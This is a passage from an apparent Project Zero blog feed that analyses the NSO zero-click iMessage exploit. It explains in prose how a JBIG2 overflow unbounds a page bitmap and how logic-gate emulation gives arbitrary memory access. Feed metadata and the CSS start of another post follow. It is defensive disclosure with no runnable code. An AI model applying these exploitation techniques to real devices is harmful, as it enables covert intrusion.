 <p class="c3"><span>By carefully structuring </span><span class="c6">refSegs</span><span>&nbsp;they can stop the overflow after writing exactly three more </span><span class="c6">JBIG2Bitmap</span><span>&nbsp;pointers after the end of the </span><span class="c6">segments</span><span>&nbsp;</span><span class="c6">GList</span><span>&nbsp;buffer. This overwrites the vtable pointer and the first four fields of the </span><span class="c6">JBIG2Bitmap</span><span>&nbsp;representing the current page.</span><span>&nbsp;Due to the nature of the iOS address space layout these pointers are very likely to be in the second 4GB of virtual memory, with addresses between </span><span class="c6">0x100000000</span><span>&nbsp;and </span><span class="c6">0x1ffffffff</span><span>. Since all iOS hardware is little endian (meaning that the </span><span class="c6">w</span><span>&nbsp;and </span><span class="c6">line</span><span>&nbsp;fields are likely to be overwritten with </span><span class="c6">0x1</span><span>&nbsp;&mdash; </span><span>the most-significant half of a </span><span class="c6">JBIG2Bitmap</span><span>&nbsp;pointer) and the </span><span class="c6">segNum</span><span>&nbsp;and </span><span class="c6">h</span><span>&nbsp;fields are likely to be overwritten with the least-significant half of such a pointer, a fairly random value depending on heap layout and ASLR somewhere between </span><span class="c6">0x100000</span><span>&nbsp;and </span><span class="c6">0xffffffff</span><span class="c5">.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>This gives the current destination page </span><span class="c6">JBIG2Bitmap</span><span>&nbsp;an unknown, but very large, value for </span><span class="c6">h</span><span>. Since that </span><span class="c6">h</span><span>&nbsp;value is used for bounds checking and is supposed to reflect the allocated size of the page backing buffer, this has the effect of &quot;unbounding&quot; the drawing canvas. This means that subsequent </span><span class="c6">JBIG2</span><span class="c5">&nbsp;segment commands can read and write memory outside of the original bounds of the page backing buffer.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>The heap groom also places the current page&#39;s backing buffer just below the undersized </span><span class="c6">syms</span><span>&nbsp;buffer, such that when the page </span><span class="c6">JBIG2Bitmap</span><span>&nbsp;is unbounded, it&#39;s able to </span><span>read and write</span><span class="c5">&nbsp;its own fields:</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c4"><hr style="page-break-before:always;display:none;"></p>

 <p class="c4"><span class="c5"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidgMVssjmRf7_LhtPKH-MCSJdXOZk5t6EAm-FLazQh5ssP2ksV4kIlzxSIOGz5Elrm8ROuBz92K4-Jthwu4WYa8vN61EgdpB5dbtuCULDRFhqK1TkPOE8xl63p9MAIgf1dNwYKgkYMwlgoNEFcvdDmXy6GdlcRQ5ESrN8d3bAYIEse7dGPQc3cbo8h/s550/image5%282%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidgMVssjmRf7_LhtPKH-MCSJdXOZk5t6EAm-FLazQh5ssP2ksV4kIlzxSIOGz5Elrm8ROuBz92K4-Jthwu4WYa8vN61EgdpB5dbtuCULDRFhqK1TkPOE8xl63p9MAIgf1dNwYKgkYMwlgoNEFcvdDmXy6GdlcRQ5ESrN8d3bAYIEse7dGPQc3cbo8h/s550/image5%282%29.png" border="0" alt="" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c12"><span class="c9 c7">The memory layout showing how the unbounded bitmap backing buffer is able to reference the JBIG2Bitmap object and modify fields in it as it is located after the backing buffer in memory</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>By rendering 4-byte bitmaps at the correct canvas coordinates they can write to all the fields of the page </span><span class="c6">JBIG2Bitmap</span><span>&nbsp;and b</span><span>y carefully choosing new values for </span><span class="c6">w</span><span>, </span><span class="c6">h</span><span>&nbsp;and </span><span class="c6">line</span><span>, </span><span class="c5">they can write to arbitrary offsets from the page backing buffer.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c5">At this point it would also be possible to write to arbitrary absolute memory addresses if you knew their offsets from the page backing buffer. But how to compute those offsets? Thus far, this exploit has proceeded in a manner very similar to a &quot;canonical&quot; scripting language exploit which in Javascript might end up with an unbounded ArrayBuffer object with access to memory. But in those cases the attacker has the ability to run arbitrary Javascript which can obviously be used to compute offsets and perform arbitrary computations. How do you do that in a single-pass image parser?</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c14 c8">My other compression format is turing-complete!</span></p>
 <p class="c3 c10"><span class="c14 c8"></span></p>
 <p class="c3"><span class="c5">As mentioned earlier, the sequence of steps which implement JBIG2 refinement are very flexible. Refinement steps can reference both the output bitmap and any previously created segments, as well as render output to either the current page or a segment. By carefully crafting the context-dependent part of the refinement decompression, it&#39;s possible to craft sequences of segments where only the refinement combination operators have any effect.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>In practice this means it is possible to apply the AND, OR, XOR and XNOR logical operators between memory regions at arbitrary offsets from the current page&#39;s </span><span class="c6">JBIG2Bitmap</span><span class="c5">&nbsp;backing buffer. And since that has been unbounded&hellip; it&#39;s possible to perform those logical operations on memory at arbitrary out-of-bounds offsets:</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c4"></p>
 <p class="c4"><span class="c5"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFkcS4JjzhV7pzJ5kVEmFj7WLW5Zzdc0JkYDaQBhVYIDayiYOksOID0LFOFGr9qQA44qwe3LRN9KNqOelKIflmcTDnR3k6qrtfvJ4wsoTDyuM59nmE6DGM_n_wOUMNY8HoLybtywIMq2-VdeFVwHHc9aDe0tkExa4hfvXKJ6o_m2QYT2LXp4NGDNJI/s551/image9%281%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFkcS4JjzhV7pzJ5kVEmFj7WLW5Zzdc0JkYDaQBhVYIDayiYOksOID0LFOFGr9qQA44qwe3LRN9KNqOelKIflmcTDnR3k6qrtfvJ4wsoTDyuM59nmE6DGM_n_wOUMNY8HoLybtywIMq2-VdeFVwHHc9aDe0tkExa4hfvXKJ6o_m2QYT2LXp4NGDNJI/s551/image9%281%29.png" border="0" alt="" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c12"><span class="c9 c7">The memory layout showing how logical operators can be applied out-of-bounds</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c5">It&#39;s when you take this to its most extreme form that things start to get really interesting. What if rather than operating on glyph-sized sub-rectangles you instead operated on single bits?</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c8">You can now provide as input a sequence of JBIG2 segment commands which implement a sequence of logical bit operations to apply to the page. And since the page buffer has been unbounded those bit operations can operate on arbitrary memory.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>With a bit of back-of-the-envelope scribbling you can convince yourself that with just the available AND, OR, XOR and XNOR logical</span><span>&nbsp;operators</span><span>&nbsp;you can in fact compute </span><span class="c7">any</span><span class="c5">&nbsp;computable function - the simplest proof being that you can create a logical NOT operator by XORing with 1 and then putting an AND gate in front of that to form a NAND gate:</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c4"></p>

 <p class="c4"><span class="c5"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjBpKF2iKJhndHIFtGm9xUBVjpXOM4GYcwSdNyfuUvwI-883zmbnhi_Ch6CR4XEaA6D2uaGkU3g8rNocZS_ZlWXD8rTSRGTgYact6ar43k8ywMZG6hnjDz8Yr3pC3Fh4W3dggIA_XriPw1Vc6myG-18TPe8Ffj_NGuywLqz4tpdlrbMAso-CBZcM_4X/s265/image8%282%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjBpKF2iKJhndHIFtGm9xUBVjpXOM4GYcwSdNyfuUvwI-883zmbnhi_Ch6CR4XEaA6D2uaGkU3g8rNocZS_ZlWXD8rTSRGTgYact6ar43k8ywMZG6hnjDz8Yr3pC3Fh4W3dggIA_XriPw1Vc6myG-18TPe8Ffj_NGuywLqz4tpdlrbMAso-CBZcM_4X/s265/image8%282%29.png" border="0" alt="" style="max-height: 750px; max-width: 600px;" /></a></span></p>
 <p class="c12"><span class="c9 c7">An AND gate connected to one input of an XOR gate. The other XOR gate input is connected to the constant value 1 creating an NAND.</span></p>
 <p class="c1"><span class="c9 c7"></span></p>
 <p class="c3"><span>A NAND gate is an example of a universal logic gate; one from which all other gates can be built and from which a circuit can be </span><span class="c16"><a class="c21" href="https://www.nand2tetris.org/">built to compute any computable function</a></span><span class="c5">.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c14 c8">Practical circuits</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>JBIG2 doesn&#39;t have scripting capabilities, but when combined with a vulnerability, it does have the ability to emulate circuits of arbitrary logic gates operating on arbitrary memory. So why not just use that to build your </span><span class="c7">own</span><span>&nbsp;computer architecture and script that!? That&#39;s exactly what this exploit does. Using over 70,000 segment commands defining logical bit operations, they define a small computer architecture with features such as registers and a full 64-bit adder and comparator which they use to search memory and perform arithmetic operations. It&#39;s not as fast as Javascript, but it&#39;s fundamentally computationally equivalent</span><span>.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span class="c5">The bootstrapping operations for the sandbox escape exploit are written to run on this logic circuit and the whole thing runs in this weird, emulated environment created out of a single decompression pass through a JBIG2 stream. It&#39;s pretty incredible, and at the same time, pretty terrifying.</span></p>
 <p class="c3 c10"><span class="c5"></span></p>
 <p class="c3"><span>In a future post (currently being finished),</span><span>&nbsp;we&#39;ll take a look at exactly how they escape the </span><span class="c6">IMTranscoderAgent</span><span>&nbsp;sandbox.</span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/5073082417618502919/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/5073082417618502919
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/5073082417618502919
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html
## @title
A deep dive into an NSO zero-click iMessage exploit: Remote Code Execution
## author
## name
Ryan
## uri
http://www.blogger.com/profile/17011901605865574886
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvP0VlEQXC6TZWOu-zPOWC-Pnyy3uqOJpwPeP3Y_rz-ZO_MvrqjiMtMwxzIz_E8NdNyrV_Fvx-RRApoMxAPrYQcHO4eiico20He9zMm3UT5-j84CCRZDJq5hjMmeIKd0aLMsflCkfrfVHp1z1PbQmYPFX6UlVtn6_gF8P6iTQaAHL3EQ6iKs4VDdEZ/s72-c/image2%281%29.jpg
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-7868790017880077590
## published
01/12/2021 15:38:00
## updated
01/12/2021 19:27:11
## title
## @type
text
## #text
This shouldn't have happened: A vulnerability postmortem
## content
## @type
html
## #text
<style type="text/css">@import url('https://themes.googleusercontent.com/fonts/css?kit=t66UaDGGO9uRFa9A_n0Ge4kPz49mG1-u2NJpkhDAP5E');.lst-kix_q4elz23jmthh-5>li{counter-increment:lst-ctn-kix_q4elz23jmthh-5}ol.lst-kix_q4elz23jmthh-6.start{counter-reset:lst-ctn-kix_q4elz23jmthh-6 0}ul.lst-kix_wy7koemfbmv1-3{list-style-type:none}ul.lst-kix_wy7koemfbmv1-2{list-style-type:none}ul.lst-kix_wy7koemfbmv1-5{list-style-type:none}.lst-kix_2hgb22nra90i-8>li:before{content:"\0025a0  "}ul.lst-kix_wy7koemfbmv1-4{list-style-type:none}ul.lst-kix_wy7koemfbmv1-1{list-style-type:none}.lst-kix_2hgb22nra90i-7>li:before{content:"\0025cb  "}ul.lst-kix_wy7koemfbmv1-0{list-style-type:none}ol.lst-kix_q4elz23jmthh-0.start{counter-reset:lst-ctn-kix_q4elz23jmthh-0 0}.lst-kix_2hgb22nra90i-4>li:before{content:"\0025cb  "}.lst-kix_2hgb22nra90i-6>li:before{content:"\0025cf  "}.lst-kix_2hgb22nra90i-5>li:before{content:"\0025a0  "}ul.lst-kix_z8xtsan2wa5s-5{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-6{list-style-type:none}.lst-kix_q4elz23jmthh-7>li{counter-increment:lst-ctn-kix_q4elz23jmthh-7}ul.lst-kix_z8xtsan2wa5s-7{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-8{list-style-type:none}.lst-kix_2hgb22nra90i-0>li:before{content:"\0025cf  "}.lst-kix_2hgb22nra90i-2>li:before{content:"\0025a0  "}.lst-kix_2hgb22nra90i-3>li:before{content:"\0025cf  "}ul.lst-kix_z8xtsan2wa5s-0{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-1{list-style-type:none}ul.lst-kix_wy7koemfbmv1-7{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-2{list-style-type:none}ul.lst-kix_wy7koemfbmv1-6{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-3{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-4{list-style-type:none}.lst-kix_2hgb22nra90i-1>li:before{content:"\0025cb  "}ul.lst-kix_wy7koemfbmv1-8{list-style-type:none}.lst-kix_q4elz23jmthh-5>li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-5,lower-roman) ". "}.lst-kix_q4elz23jmthh-6>li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-6,decimal) ". "}.lst-kix_q4elz23jmthh-4>li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-4,lower-latin) ". "}.lst-kix_q4elz23jmthh-8>li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-8,lower-roman) ". "}.lst-kix_oetzaqvyxxoa-0>li:before{content:"\0025cf  "}.lst-kix_oetzaqvyxxoa-1>li:before{content:"\0025cb  "}.lst-kix_oetzaqvyxxoa-2>li:before{content:"\0025a0  "}.lst-kix_oetzaqvyxxoa-3>li:before{content:"\0025cf  "}.lst-kix_q4elz23jmthh-7>li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-7,lower-latin) ". "}.lst-kix_q4elz23jmthh-0>li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-0,decimal) ". "}.lst-kix_q4elz23jmthh-1>li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-1,lower-latin) ". "}.lst-kix_q4elz23jmthh-2>li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-2,lower-roman) ". "}.lst-kix_q4elz23jmthh-3>li{counter-increment:lst-ctn-kix_q4elz23jmthh-3}.lst-kix_q4elz23jmthh-3>li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-3,decimal) ". "}ul.lst-kix_ohd9cwgi2ci1-5{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-4{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-7{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-6{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-8{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-2{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-3{list-style-type:none}.lst-kix_oetzaqvyxxoa-6>li:before{content:"\0025cf  "}.lst-kix_oetzaqvyxxoa-7>li:before{content:"\0025cb  "}ul.lst-kix_ugjdqlaeq7aq-0{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-1{list-style-type:none}ol.lst-kix_q4elz23jmthh-5.start{counter-reset:lst-ctn-kix_q4elz23jmthh-5 0}ul.lst-kix_ugjdqlaeq7aq-6{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-7{list-style-type:none}.lst-kix_oetzaqvyxxoa-4>li:before{content:"\0025cb  "}.lst-kix_oetzaqvyxxoa-5>li:before{content:"\0025a0  "}.lst-kix_oetzaqvyxxoa-8>li:before{content:"\0025a0  "}ul.lst-kix_ugjdqlaeq7aq-4{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-5{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-8{list-style-type:none}.lst-kix_x7i5vtjupm2f-2>li:before{content:"\0025a0  "}.lst-kix_x7i5vtjupm2f-6>li:before{content:"\0025cf  "}ul.lst-kix_2fd9br43vo52-4{list-style-type:none}ul.lst-kix_2fd9br43vo52-3{list-style-type:none}.lst-kix_ohd9cwgi2ci1-3>li:before{content:"\0025cf  "}ul.lst-kix_2fd9br43vo52-6{list-style-type:none}ul.lst-kix_2fd9br43vo52-5{list-style-type:none}ul.lst-kix_2fd9br43vo52-8{list-style-type:none}.lst-kix_fvn7czyjg1wz-2>li:before{content:"\0025a0  "}ul.lst-kix_2fd9br43vo52-7{list-style-type:none}.lst-kix_x7i5vtjupm2f-4>li:before{content:"\0025cb  "}.lst-kix_2fd9br43vo52-3>li:before{content:"\0025cf  "}.lst-kix_fvn7czyjg1wz-4>li:before{content:"\0025cb  "}ul.lst-kix_2fd9br43vo52-0{list-style-type:none}.lst-kix_2fd9br43vo52-5>li:before{content:"\0025a0  "}ul.lst-kix_2fd9br43vo52-2{list-style-type:none}ul.lst-kix_2fd9br43vo52-1{list-style-type:none}.lst-kix_4idwybng3hbx-2>li:before{content:"\0025a0  "}.lst-kix_2fd9br43vo52-7>li:before{content:"\0025cb  "}.lst-kix_fvn7czyjg1wz-8>li:before{content:"\0025a0  "}.lst-kix_ohd9cwgi2ci1-1>li:before{content:"\0025cb  "}.lst-kix_4idwybng3hbx-0>li:before{content:"\0025cf  "}.lst-kix_fvn7czyjg1wz-6>li:before{content:"\0025cf  "}.lst-kix_x7i5vtjupm2f-0>li:before{content:"\0025cf  "}.lst-kix_ugjdqlaeq7aq-8>li:before{content:"\0025a0  "}ul.lst-kix_fvn7czyjg1wz-2{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-1{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-0{list-style-type:none}.lst-kix_wy7koemfbmv1-4>li:before{content:"\0025cb  "}.lst-kix_ugjdqlaeq7aq-6>li:before{content:"\0025cf  "}ol.lst-kix_q4elz23jmthh-7.start{counter-reset:lst-ctn-kix_q4elz23jmthh-7 0}.lst-kix_wy7koemfbmv1-0>li:before{content:"\0025cf  "}.lst-kix_wy7koemfbmv1-2>li:before{content:"\0025a0  "}.lst-kix_ugjdqlaeq7aq-0>li:before{content:"\0025cf  "}.lst-kix_ohd9cwgi2ci1-5>li:before{content:"\0025cf  "}.lst-kix_ohd9cwgi2ci1-7>li:before{content:"\0025cf  "}.lst-kix_2fd9br43vo52-1>li:before{content:"\0025cb  "}.lst-kix_ugjdqlaeq7aq-2>li:before{content:"\0025a0  "}ul.lst-kix_2hgb22nra90i-0{list-style-type:none}ul.lst-kix_2hgb22nra90i-1{list-style-type:none}ul.lst-kix_2hgb22nra90i-2{list-style-type:none}ul.lst-kix_2hgb22nra90i-3{list-style-type:none}.lst-kix_fvn7czyjg1wz-0>li:before{content:"\0025cf  "}.lst-kix_ugjdqlaeq7aq-4>li:before{content:"\0025cb  "}ul.lst-kix_2hgb22nra90i-4{list-style-type:none}ul.lst-kix_2hgb22nra90i-5{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-8{list-style-type:none}ul.lst-kix_2hgb22nra90i-6{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-7{list-style-type:none}ul.lst-kix_2hgb22nra90i-7{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-6{list-style-type:none}ul.lst-kix_2hgb22nra90i-8{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-5{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-4{list-style-type:none}.lst-kix_x7i5vtjupm2f-8>li:before{content:"\0025a0  "}ul.lst-kix_fvn7czyjg1wz-3{list-style-type:none}ul.lst-kix_81cegzboe9ky-8{list-style-type:none}ul.lst-kix_81cegzboe9ky-5{list-style-type:none}ul.lst-kix_81cegzboe9ky-4{list-style-type:none}ul.lst-kix_81cegzboe9ky-7{list-style-type:none}ul.lst-kix_81cegzboe9ky-6{list-style-type:none}ol.lst-kix_q4elz23jmthh-8.start{counter-reset:lst-ctn-kix_q4elz23jmthh-8 0}ul.lst-kix_oetzaqvyxxoa-2{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-3{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-0{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-1{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-6{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-7{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-4{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-5{list-style-type:none}ul.lst-kix_oetzaqvyxxoa-8{list-style-type:none}ul.lst-kix_4idwybng3hbx-5{list-style-type:none}ul.lst-kix_4idwybng3hbx-4{list-style-type:none}.lst-kix_81cegzboe9ky-2>li:before{content:"\0025a0  "}.lst-kix_81cegzboe9ky-4>li:before{content:"\0025cb  "}ul.lst-kix_4idwybng3hbx-7{list-style-type:none}ul.lst-kix_4idwybng3hbx-6{list-style-type:none}.lst-kix_wy7koemfbmv1-6>li:before{content:"\0025cf  "}ul.lst-kix_4idwybng3hbx-8{list-style-type:none}.lst-kix_2gk0zovl15u8-4>li:before{content:"\0025cb  "}.lst-kix_81cegzboe9ky-0>li:before{content:"\0025cf  "}.lst-kix_81cegzboe9ky-6>li:before{content:"\0025cf  "}.lst-kix_81cegzboe9ky-8>li:before{content:"\0025a0  "}.lst-kix_wy7koemfbmv1-8>li:before{content:"\0025a0  "}ul.lst-kix_4idwybng3hbx-1{list-style-type:none}ul.lst-kix_4idwybng3hbx-0{list-style-type:none}ul.lst-kix_4idwybng3hbx-3{list-style-type:none}.lst-kix_2gk0zovl15u8-6>li:before{content:"\0025cf  "}ul.lst-kix_4idwybng3hbx-2{list-style-type:none}.lst-kix_prwgb47nvxz6-8>li:before{content:"\0025a0  "}.lst-kix_2gk0zovl15u8-8>li:before{content:"\0025a0  "}ul.lst-kix_81cegzboe9ky-1{list-style-type:none}ul.lst-kix_81cegzboe9ky-0{list-style-type:none}ul.lst-kix_81cegzboe9ky-3{list-style-type:none}ul.lst-kix_81cegzboe9ky-2{list-style-type:none}.lst-kix_z8xtsan2wa5s-3>li:before{content:"\0025cf  "}.lst-kix_z8xtsan2wa5s-2>li:before{content:"\0025a0  "}.lst-kix_z8xtsan2wa5s-4>li:before{content:"\0025cb  "}.lst-kix_prwgb47nvxz6-0>li:before{content:"\0025cf  "}.lst-kix_z8xtsan2wa5s-1>li:before{content:"\0025cb  "}.lst-kix_z8xtsan2wa5s-5>li:before{content:"\0025a0  "}.lst-kix_prwgb47nvxz6-1>li:before{content:"\0025cb  "}ol.lst-kix_q4elz23jmthh-4{list-style-type:none}ol.lst-kix_q4elz23jmthh-3{list-style-type:none}ol.lst-kix_q4elz23jmthh-3.start{counter-reset:lst-ctn-kix_q4elz23jmthh-3 0}ol.lst-kix_q4elz23jmthh-6{list-style-type:none}ol.lst-kix_q4elz23jmthh-5{list-style-type:none}ol.lst-kix_q4elz23jmthh-0{list-style-type:none}ol.lst-kix_q4elz23jmthh-2{list-style-type:none}ol.lst-kix_q4elz23jmthh-1{list-style-type:none}.lst-kix_prwgb47nvxz6-6>li:before{content:"\0025cf  "}.lst-kix_prwgb47nvxz6-5>li:before{content:"\0025a0  "}.lst-kix_z8xtsan2wa5s-7>li:before{content:"\0025cb  "}.lst-kix_prwgb47nvxz6-3>li:before{content:"\0025cf  "}.lst-kix_z8xtsan2wa5s-6>li:before{content:"\0025cf  "}.lst-kix_z8xtsan2wa5s-8>li:before{content:"\0025a0  "}.lst-kix_prwgb47nvxz6-2>li:before{content:"\0025a0  "}.lst-kix_prwgb47nvxz6-4>li:before{content:"\0025cb  "}.lst-kix_2gk0zovl15u8-3>li:before{content:"\0025cf  "}.lst-kix_q4elz23jmthh-6>li{counter-increment:lst-ctn-kix_q4elz23jmthh-6}.lst-kix_2gk0zovl15u8-2>li:before{content:"\0025a0  "}.lst-kix_2gk0zovl15u8-1>li:before{content:"\0025cb  "}.lst-kix_cw1yal3teuur-8>li:before{content:"\0025a0  "}.lst-kix_2gk0zovl15u8-0>li:before{content:"\0025cf  "}.lst-kix_cw1yal3teuur-6>li:before{content:"\0025cf  "}.lst-kix_cw1yal3teuur-7>li:before{content:"\0025cb  "}.lst-kix_q4elz23jmthh-4>li{counter-increment:lst-ctn-kix_q4elz23jmthh-4}ol.lst-kix_q4elz23jmthh-8{list-style-type:none}ol.lst-kix_q4elz23jmthh-7{list-style-type:none}.lst-kix_z8xtsan2wa5s-0>li:before{content:"\0025cf  "}.lst-kix_cw1yal3teuur-0>li:before{content:"\0025cf  "}.lst-kix_cw1yal3teuur-2>li:before{content:"\0025a0  "}.lst-kix_cw1yal3teuur-3>li:before{content:"\0025cf  "}ol.lst-kix_q4elz23jmthh-4.start{counter-reset:lst-ctn-kix_q4elz23jmthh-4 0}.lst-kix_cw1yal3teuur-1>li:before{content:"\0025cb  "}.lst-kix_cw1yal3teuur-4>li:before{content:"\0025cb  "}.lst-kix_cw1yal3teuur-5>li:before{content:"\0025a0  "}.lst-kix_4idwybng3hbx-6>li:before{content:"\0025cf  "}.lst-kix_4idwybng3hbx-5>li:before{content:"\0025a0  "}.lst-kix_4idwybng3hbx-7>li:before{content:"\0025cb  "}.lst-kix_q4elz23jmthh-0>li{counter-increment:lst-ctn-kix_q4elz23jmthh-0}.lst-kix_4idwybng3hbx-3>li:before{content:"\0025cf  "}.lst-kix_4idwybng3hbx-4>li:before{content:"\0025cb  "}.lst-kix_4idwybng3hbx-8>li:before{content:"\0025a0  "}.lst-kix_x7i5vtjupm2f-5>li:before{content:"\0025a0  "}.lst-kix_x7i5vtjupm2f-7>li:before{content:"\0025cb  "}.lst-kix_x7i5vtjupm2f-3>li:before{content:"\0025cf  "}.lst-kix_ohd9cwgi2ci1-4>li:before{content:"\0025cf  "}.lst-kix_2fd9br43vo52-2>li:before{content:"\0025a0  "}.lst-kix_fvn7czyjg1wz-3>li:before{content:"\0025cf  "}ul.lst-kix_x7i5vtjupm2f-8{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-1{list-style-type:none}ul.lst-kix_x7i5vtjupm2f-4{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-0{list-style-type:none}ul.lst-kix_x7i5vtjupm2f-5{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-3{list-style-type:none}.lst-kix_2fd9br43vo52-4>li:before{content:"\0025cb  "}ul.lst-kix_x7i5vtjupm2f-6{list-style-type:none}.lst-kix_fvn7czyjg1wz-5>li:before{content:"\0025a0  "}ul.lst-kix_ohd9cwgi2ci1-2{list-style-type:none}ul.lst-kix_x7i5vtjupm2f-7{list-style-type:none}.lst-kix_ohd9cwgi2ci1-2>li:before{content:"\0025a0  "}ul.lst-kix_x7i5vtjupm2f-0{list-style-type:none}ul.lst-kix_x7i5vtjupm2f-1{list-style-type:none}ul.lst-kix_prwgb47nvxz6-8{list-style-type:none}.lst-kix_4idwybng3hbx-1>li:before{content:"\0025cb  "}ul.lst-kix_x7i5vtjupm2f-2{list-style-type:none}.lst-kix_x7i5vtjupm2f-1>li:before{content:"\0025cb  "}ul.lst-kix_x7i5vtjupm2f-3{list-style-type:none}.lst-kix_ohd9cwgi2ci1-0>li:before{content:"\0025cf  "}.lst-kix_2fd9br43vo52-6>li:before{content:"\0025cf  "}.lst-kix_fvn7czyjg1wz-7>li:before{content:"\0025cb  "}.lst-kix_wy7koemfbmv1-5>li:before{content:"\0025a0  "}ul.lst-kix_prwgb47nvxz6-2{list-style-type:none}ul.lst-kix_prwgb47nvxz6-3{list-style-type:none}ul.lst-kix_prwgb47nvxz6-0{list-style-type:none}ul.lst-kix_prwgb47nvxz6-1{list-style-type:none}ul.lst-kix_prwgb47nvxz6-6{list-style-type:none}ul.lst-kix_prwgb47nvxz6-7{list-style-type:none}ul.lst-kix_prwgb47nvxz6-4{list-style-type:none}ul.lst-kix_prwgb47nvxz6-5{list-style-type:none}.lst-kix_wy7koemfbmv1-3>li:before{content:"\0025cf  "}.lst-kix_ugjdqlaeq7aq-7>li:before{content:"\0025cb  "}.lst-kix_wy7koemfbmv1-1>li:before{content:"\0025cb  "}.lst-kix_ohd9cwgi2ci1-6>li:before{content:"\0025cf  "}.lst-kix_ugjdqlaeq7aq-1>li:before{content:"\0025cb  "}.lst-kix_2fd9br43vo52-0>li:before{content:"\0025cf  "}.lst-kix_fvn7czyjg1wz-1>li:before{content:"\0025cb  "}.lst-kix_ugjdqlaeq7aq-5>li:before{content:"\0025a0  "}.lst-kix_ugjdqlaeq7aq-3>li:before{content:"\0025cf  "}.lst-kix_q4elz23jmthh-1>li{counter-increment:lst-ctn-kix_q4elz23jmthh-1}.lst-kix_ohd9cwgi2ci1-8>li:before{content:"\0025cf  "}ol.lst-kix_q4elz23jmthh-1.start{counter-reset:lst-ctn-kix_q4elz23jmthh-1 